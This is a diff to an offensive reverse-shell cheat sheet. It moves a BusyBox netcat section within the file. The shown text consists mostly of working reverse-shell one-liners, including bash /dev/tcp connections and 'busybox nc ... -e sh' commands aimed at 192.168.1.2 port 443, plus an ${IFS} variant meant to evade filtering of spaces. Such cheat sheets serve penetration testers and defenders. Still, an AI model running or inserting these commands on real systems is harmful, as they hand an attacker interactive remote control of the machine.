@@ -14,7 +14,6 @@ Welcome to the `Offensive Reverse Shell (Cheat Sheet)`, a comprehensive reposito
 - [Netcat](#netcat)
   - [Netcat Linux](#netcat-linux)
   - [Netcat Windows](#netcat-windows)
-  - [Netcat BusyBox](#netcat-busybox)
 - [cURL](#curl)
 - [Wget](#wget)
 - [Node-RED](#node-red)
@@ -98,6 +97,19 @@ bash -i >& /dev/tcp/192.168.1.2/443 0>&1
 #bash
 0<&196;exec 196<>/dev/tcp/192.168.1.2/443; bash <&196 >&196 2>&196
 0<&196;exec 196<>/dev/tcp/192.168.1.2/443; /bin/bash <&196 >&196 2>&196
+```
+
+# <kbd>BusyBox</kbd>
+
+```sh
+#sh
+busybox nc 192.168.1.2 443 -e sh
+busybox nc 192.168.1.2 443 -e /bin/sh
+#bash
+busybox nc 192.168.1.2 443 -e bash
+busybox nc 192.168.1.2 443 -e /bin/bash
+#not space
+busybox${IFS}nc${IFS}192.168.1.2${IFS}443${IFS}-e${IFS}sh
 ```
 
 # <kbd>read line</kbd>
@@ -209,19 +221,6 @@ cp $(locate nc.exe) . && impacket-smbserver a $(pwd) -smb2support
 ```
 
 ---
-
-# <kbd>Netcat BusyBox</kbd>
-
-```sh
-#sh
-busybox nc 192.168.1.2 443 -e sh
-busybox nc 192.168.1.2 443 -e /bin/sh
-#bash
-busybox nc 192.168.1.2 443 -e bash
-busybox nc 192.168.1.2 443 -e /bin/bash
-#not space
-busybox${IFS}nc${IFS}192.168.1.2${IFS}443${IFS}-e${IFS}sh
-```
 
 ---
 
